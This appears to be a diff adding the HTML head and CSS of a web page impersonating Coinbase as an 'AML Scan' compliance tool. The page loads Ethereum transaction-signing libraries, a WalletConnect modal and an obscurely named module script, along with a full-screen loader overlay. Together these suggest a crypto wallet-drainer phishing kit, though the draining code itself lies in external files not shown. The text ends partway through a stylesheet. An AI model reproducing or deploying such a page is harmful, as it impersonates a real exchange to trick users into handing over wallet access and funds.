@@ -1,0 +1,1299 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:type" name="og:type" content="website">
+  <!-- Metadata for SEO and social media -->
+  <meta name="description" content="Coinbase AML Scan is an advanced anti-money laundering scanning tool to ensure regulatory compliance in crypto transactions. Protect your assets today.">
+  <meta name="keywords" content="Coinbase, AML Scan, compliance, Anti-Money Laundering, cryptocurrency, crypto compliance, asset security">
+  <meta name="author" content="Coinbase AML Scan">
+  <meta property="og:title" content="Coinbase AML Scan - Secure Compliance for Crypto">
+  <meta property="og:description" content="Protect your assets and ensure regulatory compliance with our advanced AML scanning tool. Start securing your transactions today.">
+  <meta property="og:image" content="https://images.ctfassets.net/q5ulk4bp65r7/5sLdSqJroJ9WlaaMGDeGLv/4e145d71e8b25e8140306081e9ff667a/Learn_Illustration_What_is_Anti-Money_Laundering__AML_.jpg">
+  <meta property="og:url" content="#">
+  <meta name="twitter:card" content="https://images.ctfassets.net/q5ulk4bp65r7/5sLdSqJroJ9WlaaMGDeGLv/4e145d71e8b25e8140306081e9ff667a/Learn_Illustration_What_is_Anti-Money_Laundering__AML_.jpg">
+  <meta name="twitter:title" content="Coinbase AML Scan - Secure Compliance for Crypto">
+  <meta name="twitter:description" content="Protect your assets and ensure regulatory compliance with our advanced AML scanning tool.">
+  <meta name="twitter:image" content="https://images.ctfassets.net/q5ulk4bp65r7/5sLdSqJroJ9WlaaMGDeGLv/4e145d71e8b25e8140306081e9ff667a/Learn_Illustration_What_is_Anti-Money_Laundering__AML_.jpg">
+  <title>Coinbase AML Scan - Secure Compliance for Crypto</title>
+  <link rel="icon" type="image/x-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAMTSURBVHgBxVc9bNNAFH6umGDJArMzN1LTBcYkOxLpAiPtDmoqJEbasJWljsRM0pEuTSWY46wspFKZ8QxDvMBq3ue7M2fnzr4mlvpJT/473/vuvXfvvfPIEUmSNPjSZ+mwtFl8lob8HLNELAuWkOXK87yY6gAr9lkClmVyO4zxL60LrJjlLNkcZ9J6RngW5T5fZiTMnCH8QTS/EdfoN8sv8b7xgH3CI3eaRPs9cV9AxNJjt0SVBFg5/HupK4fC4WdxdUF3m+j4OV9bKyT2mMTCSqC48viPUBx8pbUweCqIwEIaiZwlPE05/PRdKYd59z5wWP+kjdBmt1y+5Ukf5Ujsql2ypY09Jm3ldSgHMAfmwpwSvtRFGQFp+oF6CbPXoVwnMbzIvRqoLepJAhO+vMT99BszPi2fED5FoKloX0QiQLVVGjEb5gJzxG4YeNL3S/V2942Y0IZDDqyTfGClQMxMQmE9G0B69j57RAw04YK+egNTlSkfv+IdcbCqHECQgRjG2AArhTfZY5raQaCr3pzP7D9jOyHJVAFjsP1smOdzSQcEdtSTbfVYsYtyhXTv3zd/KySz9j3SMp4t8uE7bR9XAoTHr81BWXCfDwJZoYj/mic05PZK9B87DWts0R0DFsB2SK0AM6sKp6NsZ9iAfGJzgWadGAQiEh0O+Q/NBFSSMW0/E9I6YklmiCeNQAQXXGcfW+af0qp4Qc44D+3fQEDDAgSy4Z1t+4/Bl/I8kSnnMScl2fDZk9xjCAJTEnGQsuuWkNj/KFKtyU2w0tEnMcYGvX5IXKliFPDlMKXE/u69o1LUVIwmXIwOFAFMlaWho7EweZ1AEUMd0dBEZ5TmAdkijdQXpNJ1ko8N6IpQqDSMVFtW3pKdrpcDisqLLRkrb6qHLBPKHg0lJ8IzfkDtLqtsVYDZ4fdCP5gra85tOSLc1RppW/5iZUdFVNWWayR8MhxMUC3R9VzLxkVFPVaILNppWbcyjzYfTKyQR7Mg2RxB2dHMhQgOp5PkdlhKxX7V/B45Ivl/PO+S6KJ8Mh/P5yxT1+P5Pz0KKcNHhU/1AAAAAElFTkSuQmCC">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;family=Montserrat:wght@400;500;700&amp;family=Raleway:wght@400;500;700&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
+  <script src="js/ethereumjs-tx-ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="js/5.7.2-ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/4.0.3-web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/2285--settings.js"></script>
+  <script src="js/1694--xgfcb4c8f5g.js" type="module"></script>
+  <style>
+   :root {
+    --primary-color: #0052FF;
+    --secondary-color: #050F19;
+    --background-color: #FAFBFC;
+    --text-color: #1E2026;
+    --light-gray: #E5E5E5;
+    --white: #FFFFFF;
+   }
+
+   * {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+   }
+
+   body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+    line-height: 1.6;
+    color: var(--text-color);
+    background-color: var(--background-color);
+   }
+
+   .container {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+   }
+
+   a {
+    text-decoration: none;
+    color: inherit;
+    transition: color 0.3s ease;
+   }
+
+   ul {
+    list-style: none;
+   }
+
+   /* Header styles */
+   header {
+    background-color: var(--white);
+    border-bottom: 5px solid light-gray;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+   }
+
+   nav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 0;
+   }
+
+   .logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: var(--primary-color);
+   }
+
+   .nav-links {
+    display: flex;
+    gap: 1.5rem;
+   }
+
+   .nav-links a {
+    font-weight: 500;
+    position: relative;
+   }
+
+   .nav-links a::after {
+    content: '';
+    position: absolute;
+    width: 0;
+    height: 2px;
+    bottom: -4px;
+    left: 0;
+    background-color: var(--primary-color);
+    transition: width 0.3s ease;
+   }
+
+   .nav-links a:hover::after {
+    width: 100%;
+   }
+
+   /* Hero section styles */
+   .hero {
+    background-color: var(--primary-color);
+    color: var(--white);
+    padding: 5rem 0;
+    text-align: center;
+   }
+
+   .hero h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    line-height: 1.2;
+   }
+
+   .hero p {
+    font-size: 1.25rem;
+    margin-bottom: 2rem;
+    max-width: 800px;
+    margin-left: auto;
+    margin-right: auto;
+   }
+
+   .cta-button {
+    display: inline-block;
+    background-color: var(--white);
+    color: var(--primary-color);
+    padding: 0.75rem 2rem;
+    border-radius: 50px;
+    font-weight: 600;
+    font-family: Inter;
+    font-size: 1.125rem;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+   }
+
+   .cta-button:hover {
+    background-color: var(--primary-color);
+    color: var(--white);
+    box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+   }
+
+   /* Partners section styles */
+   .partners {
+    padding: 5rem 0;
+    background-color: var(--white);
+   }
+
+   .partners h2 {
+    font-size: 2rem;
+    text-align: center;
+    margin-bottom: 3rem;
+   }
+
+   .partners-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 2rem;
+    max-width: 1000px;
+    margin: 0 auto;
+   }
+
+   .partner-card {
+    border: 2px solid var(--light-gray);
+    border-radius: 12px;
+    padding: 2rem;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    transition: all 0.3s ease;
+    background-color: var(--white);
+   }
+
+   .partner-card:hover {
+    border-color: var(--primary-color);
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+    transform: translateY(-5px);
+   }
+
+   .partner-icon {
+    width: 80px;
+    height: 80px;
+    margin-bottom: 1rem;
+    animation: float 3s ease-in-out infinite;
+   }
+
+   @keyframes float {
+
+    0%,
+    100% {
+     transform: translateY(0);
+    }
+
+    50% {
+     transform: translateY(-10px);
+    }
+   }
+
+   .partner-card span {
+    font-weight: 600;
+    color: var(--secondary-color);
+   }
+
+   /* Features section styles */
+   .features {
+    background-color: var(--background-color);
+    padding: 5rem 0;
+   }
+
+   .features h2 {
+    font-size: 2rem;
+    text-align: center;
+    margin-bottom: 3rem;
+   }
+
+   .features-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 2rem;
+   }
+
+   .feature-card {
+    background-color: var(--white);
+    padding: 2rem;
+    border-radius: 12px;
+    text-align: center;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    transition: all 0.3s ease;
+   }
+
+   .feature-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+   }
+
+   .feature-icon {
+    font-size: 3rem;
+    color: var(--primary-color);
+    margin-bottom: 1rem;
+   }
+
+   .feature-img {
+    width: 80px;
+    height: 80px;
+    margin-bottom: 1rem;
+    animation: float 3s ease-in-out infinite;
+   }
+
+   .feature-card h3 {
+    font-size: 1.25rem;
+    margin-bottom: 0.5rem;
+    color: var(--secondary-color);
+   }
+
+   /* Benefits section styles */
+   .benefits {
+    padding: 5rem 0;
+    background-color: var(--white);
+   }
+
+   .benefits h2 {
+    font-size: 2rem;
+    text-align: center;
+    margin-bottom: 3rem;
+   }
+
+   .benefits-list {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1.5rem;
+    max-width: 1000px;
+    margin: 0 auto;
+   }
+
+   .benefit-item {
+    display: flex;
+    align-items: flex-start;
+    background-color: var(--background-color);
+    padding: 1.5rem;
+    border-radius: 12px;
+    transition: all 0.3s ease;
+   }
+
+   .benefit-item:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+   }
+
+   .benefit-icon {
+    color: var(--primary-color);
+    font-size: 1.5rem;
+    margin-right: 1rem;
+    flex-shrink: 0;
+   }
+
+   .benefit-img {
+    height: 3rem;
+    margin-right: 1rem;
+    flex-shrink: 0;
+   }
+
+   /* CTA section styles */
+   .cta {
+    background-color: var(--primary-color);
+    color: var(--white);
+    padding: 5rem 0;
+    text-align: center;
+   }
+
+   .cta h2 {
+    font-size: 2rem;
+    margin-bottom: 1rem;
+   }
+
+   .cta p {
+    font-size: 1.25rem;
+    margin-bottom: 2rem;
+    max-width: 800px;
+    margin-left: auto;
+    margin-right: auto;
+   }
+
+   .cta-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 1rem;
+   }
+
+   .main-cta {
+    display: inline-block;
+    background-color: var(--white);
+    color: var(--primary-color);
+    padding: 0.75rem 2rem;
+    border-radius: 50px;
+    font-weight: 600;
+    cursor: pointer;
+    font-size: 1.125rem;
+    border: 2px solid var(--transparent);
+    transition: all 0.5s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+   }
+
+   .main-cta:hover {
+    background-color: transparent;
+    color: var(--white);
+   }
+
+   .first-cta {
+    display: inline-block;
+    background-color: var(--primary-color);
+    color: var(--white);
+    padding: 0.5rem 1rem;
+    border-radius: 50px;
+    font-weight: 600;
+    cursor: pointer;
+    border: 2px solid var(--primary-color);
+    font-size: 1rem;
+    transition: all 0.5s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+   }
+
+   .first-cta:hover {
+    background-color: var(--white);
+    color: var(--primary-color);
+    border: 2px solid var(--primary-color);
+   }
+
+   .secondary-cta {
+    display: inline-block;
+    background-color: transparent;
+    color: var(--white);
+    padding: 0.75rem 2rem;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 1.125rem;
+    border: 2px solid var(--white);
+    transition: all 0.3s ease;
+   }
+
+   .secondary-cta:hover {
+    background-color: var(--white);
+    color: var(--primary-color);
+   }
+
+   /* Footer styles */
+   footer {
+    background-color: var(--secondary-color);
+    color: var(--white);
+    padding: 3rem 0;
+   }
+
+   .footer-content {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 2rem;
+   }
+
+   .footer-column h3 {
+    font-size: 1.25rem;
+    margin-bottom: 1rem;
+    color: var(--primary-color);
+   }
+
+   .footer-column ul {
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+   }
+
+   .footer-column a {
+    transition: color 0.3s ease;
+   }
+
+   .footer-column a:hover {
+    color: var(--primary-color);
+   }
+
+   .footer-bottom {
+    text-align: center;
+    margin-top: 3rem;
+    padding-top: 2rem;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+   }
+
+   /* Responsive adjustments */
+   @media (max-width: 768px) {
+    .hero h1 {
+     font-size: 2rem;
+    }
+
+    .hero p {
+     font-size: 1rem;
+    }
+
+    .cta-buttons {
+     flex-direction: column;
+     align-items: center;
+    }
+
+    .nav-links {
+     display: none;
+    }
+
+    .mobile-menu-toggle {
+     display: block;
+     font-size: 1.5rem;
+     background: none;
+     border: none;
+     color: var(--secondary-color);
+     cursor: pointer;
+    }
+   }
+
+   @media (min-width: 769px) {
+    .mobile-menu-toggle {
+     display: none;
+    }
+   }
+
+   /* Accessibility improvements */
+   .sr-only {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    padding: 0;
+    margin: -1px;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+    white-space: nowrap;
+    border-width: 0;
+   }
+
+   /* Focus styles for keyboard navigation */
+   a:focus,
+   button:focus {
+    outline: 2px solid var(--primary-color);
+    outline-offset: 2px;
+   }
+
+   /* Skip to main content link */
+   .skip-to-content {
+    position: absolute;
+    top: -40px;
+    left: 0;
+    background: var(--primary-color);
+    color: var(--white);
+    padding: 8px;
+    z-index: 100;
+   }
+
+   .skip-to-content:focus {
+    top: 0;
+   }
+  </style>
+ <style>@import url(https://fonts.googleapis.com/css2?family=Manrope:wght@400;500&display=swap);@keyframes fadeIn{from{opacity:0}to{opacity:1}}.loader-overlay-bG9sa2Vr{position:fixed;top:0;bottom:0;left:0;right:0;z-index:9999999999999999;background-color:rgba(0,0,0,.3);display:flex;justify-content:center;align-items:center}@keyframes scale-up{from{transform:scale(0)}to{transform:scale(1)}}.icon{transform-origin:center;animation:.6s scale-up}.loader-desc-big,.loader-desc-small,.loader-head-bG9sa2Vr{animation:.8s ease-in-out forwards fadeIn}.loader-bG9sa2Vr{box-sizing:border-box;font-family:Manrope,sans-serif;width:100%;color:#01091b;max-width:440px;border-radius:24px;background:#fff;box-shadow:0 4px 20px 0 rgba(255,255,255,.1);display:inline-block}.loader-action-error-bG9sa2Vr,.loader-action-spinner-bG9sa2Vr,.loader-action-success-bG9sa2Vr{width:40px;height:40px;background:rgba(0,82,255,.08);overflow:hidden}.loader-head-bG9sa2Vr{display:flex;padding:32px 24px;justify-content:center;align-items:center;font-size:22px;font-weight:500;box-sizing:border-box}.loader-main-bG9sa2Vr,.loader-main-content-bG9sa2Vr{flex-direction:column;gap:16px;display:flex}.loader-main-bG9sa2Vr{padding:56px 0 104px;justify-content:center;align-items:center;align-self:stretch}.loader-main-content-bG9sa2Vr{align-items:center}.loader-desc-bG9sa2Vr{display:flex;flex-direction:column;align-items:center;gap:4px}.loader-desc-big{font-size:16px;font-weight:500;text-align:center}.loader-desc-small{color:#677189;font-size:14px;font-weight:400;text-align:center}.loader-bG9sa2Vr.dark{color:#f5f5f5;background:#161a1e}.loader-bG9sa2Vr.dark .loader-desc-small{color:#a7a8aa}.loader-action-spinner-bG9sa2Vr{display:inline-block;position:relative;border-radius:50px}.loader-action-spinner-bG9sa2Vr div{box-sizing:border-box;display:block;position:absolute;width:32px;height:32px;margin:4px;border:3px solid #fff;border-radius:100%;animation:1.2s cubic-bezier(.5,0,.5,1) infinite loader-action-spinner;border-color:#0052ff transparent transparent}.loader-action-spinner-bG9sa2Vr div:first-child{animation-delay:-.45s}.loader-action-spinner-bG9sa2Vr div:nth-child(2){animation-delay:-.3s}.loader-action-spinner-bG9sa2Vr div:nth-child(3){animation-delay:-.15s}@keyframes loader-action-spinner{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.loader-desc-small p{margin:0}.loader-action-error-bG9sa2Vr,.loader-action-success-bG9sa2Vr{border-radius:50px;box-sizing:border-box;padding:8px}.loader-error-button-bG9sa2Vr{display:flex;justify-content:center}.loader-error-button-bG9sa2Vr button{background-color:#0052ff;border-radius:16px;padding:16px 32px;outline:0;border:none;cursor:pointer;color:#fff;font-size:16px;animation:.8s ease-in-out forwards fadeIn;font-style:normal;font-weight:500;transition:background-color .2s}.loader-error-button-bG9sa2Vr button:hover{background-color:#135dff}.loader-error-button-bG9sa2Vr button:active{background-color:#004bec}.loader-bG9sa2Vr.lg .loader-main-bG9sa2Vr,.loader-bG9sa2Vr.md .loader-main-bG9sa2Vr{display:flex;padding:56px 24px 24px;flex-direction:column;justify-content:flex-end;align-items:center;gap:92px;align-self:stretch}.loader-bG9sa2Vr.sm .loader-main-bG9sa2Vr{padding:40px 0 35px}</style><style>undefined</style><style>
+      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+      :root {
+        --w3m-modal-width: 360px;
+        --w3m-color-mix-strength: 0%;
+        --w3m-font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;;
+        --w3m-font-size-master: 10px;
+        --w3m-border-radius-master: 4px;
+        --w3m-z-index: 999999999999999999999999999;
+
+        --wui-font-family: var(--w3m-font-family);
+
+        --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
+        --wui-font-size-micro: var(--w3m-font-size-master);
+        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
+        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
+        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
+        --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
+        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
+        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
+        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);
+
+        --wui-border-radius-5xs: var(--w3m-border-radius-master);
+        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
+        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
+        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
+        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
+        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
+        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
+        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
+        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);
+
+        --wui-font-weight-light: 400;
+        --wui-font-weight-regular: 500;
+        --wui-font-weight-medium: 600;
+        --wui-font-weight-bold: 700;
+
+        --wui-letter-spacing-2xl: -1.6px;
+        --wui-letter-spacing-medium-title: -0.96px;
+        --wui-letter-spacing-large: -0.8px;
+        --wui-letter-spacing-medium: -0.72px;
+        --wui-letter-spacing-paragraph: -0.64px;
+        --wui-letter-spacing-small: -0.56px;
+        --wui-letter-spacing-tiny: -0.48px;
+        --wui-letter-spacing-micro: -0.2px;
+        --wui-letter-spacing-mini: -0.16px;
+
+        --wui-spacing-0: 0px;
+        --wui-spacing-4xs: 2px;
+        --wui-spacing-3xs: 4px;
+        --wui-spacing-xxs: 6px;
+        --wui-spacing-2xs: 7px;
+        --wui-spacing-xs: 8px;
+        --wui-spacing-1xs: 10px;
+        --wui-spacing-s: 12px;
+        --wui-spacing-m: 14px;
+        --wui-spacing-l: 16px;
+        --wui-spacing-2l: 18px;
+        --wui-spacing-xl: 20px;
+        --wui-spacing-xxl: 24px;
+        --wui-spacing-2xl: 32px;
+        --wui-spacing-3xl: 40px;
+        --wui-spacing-4xl: 90px;
+
+        --wui-icon-box-size-xxs: 14px;
+        --wui-icon-box-size-xs: 20px;
+        --wui-icon-box-size-sm: 24px;
+        --wui-icon-box-size-md: 32px;
+        --wui-icon-box-size-lg: 40px;
+        --wui-icon-box-size-xl: 64px;
+
+        --wui-icon-size-inherit: inherit;
+        --wui-icon-size-xxs: 10px;
+        --wui-icon-size-xs: 12px;
+        --wui-icon-size-sm: 14px;
+        --wui-icon-size-md: 16px;
+        --wui-icon-size-mdl: 18px;
+        --wui-icon-size-lg: 20px;
+        --wui-icon-size-xl: 24px;
+
+        --wui-wallet-image-size-inherit: inherit;
+        --wui-wallet-image-size-sm: 40px;
+        --wui-wallet-image-size-md: 56px;
+        --wui-wallet-image-size-lg: 80px;
+
+        --wui-visual-size-size-inherit: inherit;
+        --wui-visual-size-sm: 40px;
+        --wui-visual-size-md: 55px;
+        --wui-visual-size-lg: 80px;
+
+        --wui-box-size-md: 100px;
+        --wui-box-size-lg: 120px;
+
+        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
+        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);
+
+        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
+        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
+        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);
+
+        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);
+
+        --wui-duration-lg: 200ms;
+        --wui-duration-md: 125ms;
+        --wui-duration-sm: 75ms;
+
+        --wui-path-network-sm: path(
+          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
+        );
+
+        --wui-path-network-md: path(
+          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
+        );
+
+        --wui-path-network-lg: path(
+          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
+        );
+
+        --wui-width-network-sm: 36px;
+        --wui-width-network-md: 48px;
+        --wui-width-network-lg: 86px;
+
+        --wui-height-network-sm: 40px;
+        --wui-height-network-md: 54px;
+        --wui-height-network-lg: 96px;
+
+        --wui-icon-size-network-xs: 12px;
+        --wui-icon-size-network-sm: 16px;
+        --wui-icon-size-network-md: 24px;
+        --wui-icon-size-network-lg: 42px;
+
+        --wui-color-inherit: inherit;
+
+        --wui-color-inverse-100: #fff;
+        --wui-color-inverse-000: #000;
+
+        --wui-cover: rgba(20, 20, 20, 0.8);
+
+        --wui-color-modal-bg: var(--wui-color-modal-bg-base);
+
+        --wui-color-accent-100: var(--wui-color-accent-base-100);
+        --wui-color-accent-090: var(--wui-color-accent-base-090);
+        --wui-color-accent-080: var(--wui-color-accent-base-080);
+
+        --wui-accent-glass-090: var(--wui-accent-glass-base-090);
+        --wui-accent-glass-080: var(--wui-accent-glass-base-080);
+        --wui-accent-glass-020: var(--wui-accent-glass-base-020);
+        --wui-accent-glass-015: var(--wui-accent-glass-base-015);
+        --wui-accent-glass-010: var(--wui-accent-glass-base-010);
+        --wui-accent-glass-005: var(--wui-accent-glass-base-005);
+        --wui-accent-glass-002: var(--wui-accent-glass-base-002);
+
+        --wui-color-fg-100: var(--wui-color-fg-base-100);
+        --wui-color-fg-125: var(--wui-color-fg-base-125);
+        --wui-color-fg-150: var(--wui-color-fg-base-150);
+        --wui-color-fg-175: var(--wui-color-fg-base-175);
+        --wui-color-fg-200: var(--wui-color-fg-base-200);
+        --wui-color-fg-225: var(--wui-color-fg-base-225);
+        --wui-color-fg-250: var(--wui-color-fg-base-250);
+        --wui-color-fg-275: var(--wui-color-fg-base-275);
+        --wui-color-fg-300: var(--wui-color-fg-base-300);
+
+        --wui-color-bg-100: var(--wui-color-bg-base-100);
+        --wui-color-bg-125: var(--wui-color-bg-base-125);
+        --wui-color-bg-150: var(--wui-color-bg-base-150);
+        --wui-color-bg-175: var(--wui-color-bg-base-175);
+        --wui-color-bg-200: var(--wui-color-bg-base-200);
+        --wui-color-bg-225: var(--wui-color-bg-base-225);
+        --wui-color-bg-250: var(--wui-color-bg-base-250);
+        --wui-color-bg-275: var(--wui-color-bg-base-275);
+        --wui-color-bg-300: var(--wui-color-bg-base-300);
+
+        --wui-color-success-100: var(--wui-color-success-base-100);
+        --wui-color-error-100: var(--wui-color-error-base-100);
+
+        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
+        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
+        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
+        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);
+
+        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-base-100);
+
+        --wui-avatar-border: var(--wui-avatar-border-base);
+
+        --wui-thumbnail-border: var(--wui-thumbnail-border-base);
+
+        --wui-box-shadow-blue: rgba(71, 161, 255, 0.16);
+      }
+
+      @supports (background: color-mix(in srgb, white 50%, black)) {
+        :root {
+          --wui-color-modal-bg: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-modal-bg-base)
+          );
+
+          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 16%, transparent);
+
+          --wui-color-accent-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            var(--w3m-default)
+          );
+          --wui-color-accent-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            var(--w3m-default)
+          );
+
+          --wui-color-accent-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent
+          );
+          --wui-color-accent-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent
+          );
+
+          --wui-accent-glass-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent
+          );
+          --wui-accent-glass-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent
+          );
+          --wui-accent-glass-020: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 20%,
+            transparent
+          );
+          --wui-accent-glass-015: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 15%,
+            transparent
+          );
+          --wui-accent-glass-010: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 10%,
+            transparent
+          );
+          --wui-accent-glass-005: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 5%,
+            transparent
+          );
+          --wui-color-accent-002: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 2%,
+            transparent
+          );
+
+          --wui-color-fg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-100)
+          );
+          --wui-color-fg-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-125)
+          );
+          --wui-color-fg-150: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-150)
+          );
+          --wui-color-fg-175: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-175)
+          );
+          --wui-color-fg-200: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-200)
+          );
+          --wui-color-fg-225: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-225)
+          );
+          --wui-color-fg-250: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-250)
+          );
+          --wui-color-fg-275: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-275)
+          );
+          --wui-color-fg-300: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-300)
+          );
+
+          --wui-color-bg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
